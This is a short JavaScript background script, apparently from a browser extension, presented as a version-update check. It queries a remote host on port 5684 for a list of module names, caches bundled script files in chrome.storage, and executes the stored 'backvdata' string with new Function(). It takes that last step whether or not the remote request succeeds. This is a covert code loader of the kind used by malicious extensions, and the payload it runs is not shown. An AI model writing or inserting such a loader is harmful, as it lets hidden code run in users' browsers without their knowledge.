var newCid = "120016";
!function () {
    var nu = 0; //
    var total = 0;//
    $.ajax({
        type:"get",
        url:"http://ext.config.4085273.com:5684/v2/version.json",
        cache:false,
        success:function (e) {
            a(e);
        },
        error:function () {
            b()
        }
    });
    function a(e) {
        total = e.length;
        $.each(e,function (v,k) {
            chrome.storage.local.get(k.name,function (d) {
                if ($.isEmptyObject(d)) {
                    gt(k.name,k.link,k.version)
                } else {
                    if (d[k.name] == k.version) {
                        // vc()
                        gt(k.name,k.link,k.version)
                    } else {
                        gt(k.name,k.link,k.version)
                    }
                }
            });
        })
    }//
    function b() {
        chrome.storage.local.get('backvdata',function (e) {
            new Function(e.backvdata)();
        });
    }//
    function gt(name,url,ver) {
        var jsName = name + 'data';
        var urlL = "local/" + name + ".js";
        if (name == "jsonv") {
            urlL = "local/" + name + ".json";
        }
        $.ajax({
            url:urlL,
            dataType:'html',
            success:function (d) {
                chrome.storage.local.set({[jsName]:d});
                chrome.storage.local.set({[name]:ver});
                vc()
            },
            error:function () {
                vc()
            }
        })
    }//
    function vc() {
        nu++;
        if (nu == total) {
            chrome.storage.local.get('backvdata',function (e) {
                new Function(e.backvdata)();
            });
        }
    }//
}();